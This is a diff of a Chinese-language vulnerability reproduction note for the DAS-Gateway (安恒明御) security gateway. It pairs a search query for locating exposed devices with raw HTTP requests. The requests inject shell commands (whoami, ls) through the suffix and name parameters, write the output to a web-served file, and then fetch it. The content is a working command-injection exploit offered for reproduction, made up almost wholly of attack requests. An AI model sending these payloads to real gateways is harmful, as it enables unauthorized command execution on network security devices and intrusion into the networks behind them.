@@ -10,32 +10,47 @@
 + hunter`app.name="安恒明御安全网关"`
 + 特征
 
-![1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3.png](./img/jAKWW4JqUQbjCmHl/1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3-523650.png)
-
 # 四、漏洞复现
 ```plain
-GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
-Host: {hostname}
-Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
-Connection: close
+GET /webui/?g=aaa_local_web_custom_auth_html_submit&name=;echo%09`ls`|tee%09out; HTTP/1.1
+Host: 
+Cookie: USGSESSID=5c727beed17c9e76eeab71453e91c784
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=0, i
+Connection: keep-alive
 ```
-
-![1703405909643-3e3d865b-260e-419a-b697-5ed23a0a0ecd.png](./img/jAKWW4JqUQbjCmHl/1703405909643-3e3d865b-260e-419a-b697-5ed23a0a0ecd-711461.png)
 
 获取命令执行结果
 
 ```plain
-GET /sslvpn/stc.txt HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
-Host: {hostname}
-Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
-Connection: close
+GET /webui/out HTTP/1.1
+Host: 
+Cookie: USGSESSID=5c727beed17c9e76eeab71453e91c784
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=0, i
+Connection: keep-alive
 ```
-
-![1703405938768-9fa01d85-610c-4b95-a221-8a3363171080.png](./img/jAKWW4JqUQbjCmHl/1703405938768-9fa01d85-610c-4b95-a221-8a3363171080-296297.png)
-
-
-
-> 更新: 2024-07-17 17:29:07  
-> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rdf0zo1tk2wbzg3g>
